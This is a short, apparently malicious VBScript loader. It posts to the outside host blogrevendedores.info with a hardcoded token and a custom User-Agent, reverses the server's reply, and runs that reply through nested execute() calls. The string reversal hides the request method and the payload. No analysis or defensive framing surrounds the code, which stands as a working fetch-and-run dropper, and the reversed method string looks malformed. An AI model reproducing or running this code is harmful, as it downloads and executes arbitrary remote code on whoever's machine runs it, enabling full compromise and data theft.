set ynsPg=CreateObject("Msxml2.xmlhttp")
pah5o="flaaNVdaQwcwVo3HU6I8s3kAr"
ynsPg.open StrReverse("PO ST") , "http://blogrevendedores.info/?join=hugr&" & pah5o ,false
execute("ynsPg.setRequestHeader ""User-Agent"", ""MyCustomUser"":ynsPg.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":ynsPg.send ""join=open"":B=StrReverse(ynsPg.responseText):execute(B)")
